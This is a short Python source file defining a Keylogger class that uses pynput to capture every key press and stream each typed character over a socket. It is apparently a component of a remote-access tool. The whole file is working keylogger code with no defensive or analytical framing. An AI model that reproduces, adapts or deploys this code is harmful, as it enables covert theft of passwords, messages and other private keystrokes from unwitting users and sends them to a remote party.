from pynput import keyboard

class Keylogger:
    def __init__(self, client_socket):
        self.conn = client_socket
        self.listener = None

    def start(self):
        try:
            # Create a keyboard listener
            self.listener = keyboard.Listener(on_press=self.log)

            # Start the keyboard listener in a separate thread
            self.listener.start()

            # Wait for user input to stop the keylogger
            self.listener.join()
        except Exception as e:
            print(f"Error: {e}")

    def log(self, key):
        try:
            # Send the character over the socket to the client
            if hasattr(key, "char"):
                self.conn.send(str(key.char).encode())
        except Exception as e:
            print(f"Error while logging: {e}")

    def stop(self):
        try:
            if self.listener:
                # Stop the keyboard listener
                self.listener.stop()
                self.listener.join()
        except Exception as e:
            print(f"Error while stopping: {e}")
